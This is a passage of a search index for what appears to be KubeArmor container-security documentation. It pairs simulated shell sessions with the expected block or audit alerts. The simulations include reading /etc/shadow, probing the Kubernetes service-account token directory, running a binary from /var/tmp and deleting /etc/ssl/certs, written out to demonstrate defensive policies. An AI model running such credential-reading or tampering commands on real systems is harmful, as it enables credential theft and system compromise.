cap","text":""},{"location":"use-cases/res/res-cap/#simulation","title":"Simulation","text":"<pre><code>root@ubuntu-1-deployment-f987bd4d6-xzcb8:/# tcpdump\ntcpdump: eth0: You don't have permission to capture on that device\n(socket: Operation not permitted)\nroot@ubuntu-1-deployment-f987bd4d6-xzcb8:/#    \n</code></pre>"},{"location":"use-cases/res/res-cap/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n    \"Action\":\"Block\",\n    \"ClusterName\":\"k3sn0d3\",\n    \"ContainerID\":\"aaf2118edcc20b3b04a0fae6164f957993bf3c047fd8cb33bc37ac7d0175e848\",\n    \"ContainerImage\":\"docker.io/kubearmor/ubuntu-w-utils:0.1@sha256:b4693b003ed1fbf7f5ef2c8b9b3f96fd853c30e1b39549cf98bd772fbd99e260\",\n    \"ContainerName\":\"ubuntu-1-container\",\n    \"Data\":\"syscall=SYS_SOCKET\",\n    \"Enforcer\":\"AppArmor\",\n    \"HashID\":\"dd12f0f12a75b30d47c5815f93412f51b259b74ac0eccc9781b6843550f694a3\",\n    \"HostName\":\"worker-node02\",\n    \"HostPID\":38077,\n    \"HostPPID\":38065,\n    \"Labels\":\"container=ubuntu-1 group=group-1\",\n    \"Message\":\"\",\n    \"NamespaceName\":\"multiubuntu\",\n    \"Operation\":\"Network\",\n    \"Owner\":{\n        \"Name\":\"ubuntu-1-deployment\",\n        \"Namespace\":\"multiubuntu\",\n        \"Ref\":\"Deployment\"\n    },\n    \"PID\":124,\n    \"PPID\":114,\n    \"PodName\":\"ubuntu-1-deployment-f987bd4d6-xzcb8\",\n    \"PolicyName\":\"ksp-ubuntu-1-cap-net-raw-block\",\n    \"ProcessName\":\"/usr/sbin/tcpdump\",\n    \"Resource\":\"domain=AF_PACKET type=SOCK_RAW protocol=768\",\n    \"Result\":\"Operation not permitted\",\n    \"Severity\":\"1\",\n    \"Source\":\"/usr/sbin/tcpdump\",\n    \"Tags\":\"\",\n    \"Timestamp\":1705405378,\n    \"Type\":\"MatchedPolicy\",\n    \"UID\":0,\n    \"UpdatedTime\":\"2024-01-16T11:42:58.662928Z\",\n    \"UpdatedTimeISO\":\"2024-01-16T11:42:58.662Z\",\n    \"cluster_id\":\"16402\",\n    \"component_name\":\"kubearmor\",\n    \"instanceGroup\":\"0\",\n    \"instanceID\":\"0\",\n    \"workload\":\"1\"\n}\n</code></pre>"},{"location":"use-cases/res/sen-dat-audit/","title":"Sen dat audit","text":""},{"location":"use-cases/res/sen-dat-audit/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it wordpress-7c966b5d85-wvtln -n wordpress-mysql -- bash\nroot@wordpress-7c966b5d85-wvtln:/var/www/html# cat /etc/shadow\nroot:*:17448:0:99999:7:::\ndaemon:*:17448:0:99999:7:::\nbin:*:17448:0:99999:7:::\nsys:*:17448:0:99999:7:::\nsync:*:17448:0:99999:7:::\ngames:*:17448:0:99999:7:::\nman:*:17448:0:99999:7:::\nlp:*:17448:0:99999:7:::\n</code></pre>"},{"location":"use-cases/res/sen-dat-audit/#expected-alert","title":"Expected Alert","text":"<pre><code>ClusterName: default\nHostName: gke-cluster-1-default-pool-37f4c896-8cn6\nNamespaceName: wordpress-mysql\nPodName: wordpress-7c966b5d85-wvtln\nLabels: app=wordpress\nContainerName: wordpress\nContainerID: 6d09394a988c5cf6b9fe260d28fdd57d6ff281618869a173965ecd94a3efac44\nContainerImage: docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\nType: MatchedPolicy\nPolicyName: hsp-nist-ca-9-audit-untrusted-read-on-sensitive-files\nSeverity: 5\nMessage: Alert! Sensitive file opened for reading by non-trusted program! Possible violation of NIST CA-9 SA-20\nSource: /bin/cat /etc/shadow\nResource: /etc/shadow\nOperation: File\nAction: Audit\nData: syscall=SYS_OPEN flags=O_RDONLY\nEnforcer: eBPF Monitor\nResult: Passed\nATags: [NIST NIST-800-53-r5 CA-9 File Rules Internal System Connections NIST_SA NIST_SA-20 NIST_SA-20-Customized Development of Critical Components SA]\nHostPID: 706899\nHostPPID: 706810\nOwner: map[Name:wordpress Namespace:wordpress-mysql Ref:Deployment]\nPID: 251\nPPID: 245\nParentProcessName: /bin/bash\nProcessName: /bin/cat\nTags: NIST,NIST-800-53-r5,CA-9,File Rules,Internal System Connections,NIST_SA,NIST_SA-20,NIST_SA-20-Customized Development of Critical Components,SA\n</code></pre>"},{"location":"use-cases/res/svc-act-token-alert/","title":"Svc act token alert","text":""},{"location":"use-cases/res/svc-act-token-alert/#simulation","title":"Simulation","text":"<pre><code>root@wordpress-7c966b5d85-42jwx:/# cd /run/secrets/kubernetes.io/serviceaccount/ \nroot@wordpress-7c966b5d85-42jwx:/run/secrets/kubernetes.io/serviceaccount# ls \nls: cannot open directory .: Permission denied \nroot@wordpress-7c966b5d85-42jwx:/run/secrets/kubernetes.io/serviceaccount# \n</code></pre>"},{"location":"use-cases/res/svc-act-token-alert/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"ATags\": null,\n  \"Action\": \"Block\",\n  \"ClusterName\": \"deathiscoming\",\n  \"ContainerID\": \"bbf968e6a75f0b4412478770911c6dd05d5a83ec97ca38872246e89c31e9d41a\",\n  \"ContainerImage\": \"docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\",\n  \"ContainerName\": \"wordpress\",\n  \"Data\": \"syscall=SYS_OPENAT fd=-100 flags=O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC\",\n  \"Enforcer\": \"AppArmor\",\n  \"HashID\": \"f1c272d8d75bdd91b9c4d1dc74c8d0f222bf4ecd0008c3a22a54706563ec5827\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 11105,\n  \"HostPPID\": 10997,\n  \"Labels\": \"app=wordpress\",\n  \"Message\": \"\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"File\",\n  \"Owner\": {\n    \"Name\": \"\",\n    \"Namespace\": \"\",\n    \"Ref\": \"\"\n  },\n  \"PID\": 204,\n  \"PPID\": 194,\n  \"PodName\": \"wordpress-7c966b5d85-42jwx\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/bin/ls\",\n  \"Resource\": \"/run/secrets/kubernetes.io/serviceaccount\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"\",\n  \"Source\": \"/bin/ls\",\n  \"Tags\": \"\",\n  \"Timestamp\": 1695903189,\n  \"Type\": \"MatchedPolicy\",\n  \"UID\": 0,\n  \"UpdatedTime\": \"2023-09-28T12:13:09.159252Z\",\n  \"cluster_id\": \"3664\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/res/sysc-for/","title":"Sysc for","text":""},{"location":"use-cases/res/sysc-for/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it wordpress-7c966b5d85-wvtln -n wordpress-mysql -- bash\nroot@wordpress-7c966b5d85-wvtln:/var/www/html# ls\nindex.php    readme.html      wp-blog-header.php    wp-config.php  wp-includes        wp-login.php    myfile.txt        \nroot@wordpress-7c966b5d85-wvtln:/var/www/html# unlink myfile.txt\nroot@wordpress-7c966b5d85-wvtln:/var/www/html# ls\nindex.php    readme.html      wp-admin            wp-comments-post.php  wp-config.php  wp-cron.php  wp-links-opml.php  wp-login.php  wp-settings.php  wp-trackback.php\n</code></pre>"},{"location":"use-cases/res/sysc-for/#expected-alert","title":"Expected Alert","text":"<pre><code>ClusterName: default\nHostName: gke-cluster-1-default-pool-37f4c896-8cn6\nNamespaceName: wordpress-mysql\nPodName: wordpress-7c966b5d85-wvtln\nLabels: app=wordpress\nContainerName: wordpress\nContainerID: 6d09394a988c5cf6b9fe260d28fdd57d6ff281618869a173965ecd94a3efac44\nContainerImage: docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\nType: MatchedPolicy\nPolicyName: auditing-syscalls\nSeverity: 1\nMessage: Warning! Syscall Alert\nSource: /usr/bin/unlink myfile.txt\nResource: /var/www/html/myfile.txt\nOperation: Syscall\nAction: Audit\nData: syscall=SYS_UNLINK\nResult: Passed\nATags: [CIS-4.4 4.3 4.12 NIST-4.4 4.3 4.12 MITRE-T1602]\nHostPID: 741541\nHostPPID: 739395\nOwner: map[Name:wordpress Namespace:wordpress-mysql Ref:Deployment]\nPID: 278\nPPID: 261\nParentProcessName: /bin/bash\nProcessName: /usr/bin/unlink\nTags: CIS-4.4,4.3,4.12,NIST-4.4,4.3,4.12,MITRE-T1602\n</code></pre>"},{"location":"use-cases/res/tmp-noexec/","title":"Tmp noexec","text":""},{"location":"use-cases/res/tmp-noexec/#simulation","title":"Simulation","text":"<pre><code>root@wordpress-fb448db97-wj7n7:/var/tmp# ls /var/tmp                                                                    xvzf                                                                                                                    \nroot@wordpress-fb448db97-wj7n7:/var/tmp# /var/tmp/xvzf                                                                  \nbash: /var/tmp/xvzf: Permission denied                                                                                  \nroot@wordpress-fb448db97-wj7n7:/var/tmp#  \n</code></pre>"},{"location":"use-cases/res/tmp-noexec/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"d3mo\",\n  \"ContainerID\": \"548176888fca6bb6d66633794f3d5f9d54930a9d9f43d4f05c11de821c758c0f\",\n  \"ContainerImage\": \"docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\",\n  \"ContainerName\": \"wordpress\",\n  \"Data\": \"syscall=SYS_OPEN flags=O_WRONLY|O_CREAT|O_EXCL|O_TRUNC\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"master-node\",\n  \"HostPID\": 30490,\n  \"HostPPID\": 6119,\n  \"Labels\": \"app=wordpress\",\n  \"Message\": \"Alert! Execution attempted inside /tmp\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"File\",\n  \"Owner\": {\n    \"Name\": \"wordpress\",\n    \"Namespace\": \"wordpress-mysql\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 193,\n  \"PPID\": 6119,\n  \"ParentProcessName\": \"/var/lib/rancher/k3s/data/24a53467e274f21ca27cec302d5fbd58e7176daf0a47a2c9ce032ee877e0979a/bin/containerd-shim-runc-v2\",\n  \"PodName\": \"wordpress-fb448db97-wj7n7\",\n  \"PolicyName\": \"ksp-block-exec-inside-tmp\",\n  \"ProcessName\": \"/bin/bash\",\n  \"Resource\": \"/tmp/sh-thd-2512146865\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"1\",\n  \"Source\": \"/bin/bash\",\n  \"Tags\": \"CIS,CIS_Linux\",\n  \"Timestamp\": 1696492433,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-05T07:53:53.259403Z\",\n  \"cluster_id\": \"2302\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/res/trusted-cert-bundle/","title":"Trusted cert bundle","text":""},{"location":"use-cases/res/trusted-cert-bundle/#simulation","title":"Simulation","text":"<pre><code> kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash\nroot@mysql-74775b4bf4-65nqf:/# cd /etc/ssl/\nroot@mysql-74775b4bf4-65nqf:/etc/ssl# ls\ncerts\nroot@mysql-74775b4bf4-65nqf:/etc/ssl# rmdir certs\nrmdir: failed to remove 'certs': Permission denied\nroot@mysql-74775b4bf4-65nqf:/etc/ssl# cd certs/\nroot@mysql-74775b4bf4-65nqf:/etc/ssl/certs# touch new\ntouch: cannot touch 'new': Permission denied\nroot@mysql-74775b4bf4-65nqf:/etc/ssl/certs#\n</code></pre>"},{"location":"use-cases/res/trusted-cert-bundle/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"aditya\",\n  \"ContainerID\": \"b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4\",\n  \"ContainerImage\": \"docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae\",\n  \"ContainerName\": \"mysql\",\n  \"Data\": \"syscall=SYS_RMDIR\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 24462,\n  \"HostPPID\": 24411,\n  \"Labels\": \"app=mysql\",\n  \"Message\": \"Credentials modification denied\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"File\",\n  \"Owner\": {\n    \"Name\": \"mysql\",\n    \"Namespace\": \"wordpress-mysql\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 185,\n  \"PPID\": 179,\n  \"ParentProcessName\": \"/bin/bash\",\n  \"PodName\": \"mysql-74775b4bf4-65nqf\",\n  \"PolicyName\": \"harden-mysql-trusted-cert-mod\",\n  \"ProcessName\": \"/bin/rmdir\",\n  \"Resource\": \"/etc/ssl/certs\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"1\",\n  \"Source\": \"/bin/rmdir certs\",\n  \"Tags\": \"MITRE,MITRE_T1552_unsecured_credentials,FGT1555,FIGHT\",\n  \"Timestamp\": 1696320102,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-03T08:01:42.373810Z\",\n  \"cluster_id\": \"3896\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"}]}